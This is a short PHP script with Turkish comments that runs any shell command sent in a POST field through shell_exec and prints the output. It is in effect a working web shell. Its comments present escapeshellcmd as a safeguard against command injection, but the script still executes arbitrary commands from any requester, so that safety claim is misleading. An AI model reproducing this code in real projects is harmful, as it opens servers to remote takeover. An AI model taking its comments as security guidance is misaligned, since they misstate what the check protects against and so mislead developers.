<?php
// Güvenlik önlemi: Komutları doğrudan çalıştırmak tehlikeli olabilir. 
// Burada örnek bir kontrol yapıyoruz. Gerçek uygulamada, yalnızca belirli komutlara izin vermek gerekebilir.

// Eğer bir komut gönderilmişse
if (isset($_POST['command'])) {
    $command = escapeshellcmd($_POST['command']);  // Komutu escape ederiz (komut enjeksiyonunu engellemek için)

    // Komutun çıktısını alalım
    $output = shell_exec($command);

    // Çıktıyı geri gönderiyoruz
    echo nl2br(htmlentities($output));  // Çıktıyı HTML formatında döndürüyoruz
} else {
    echo "No command received.";
}
?>
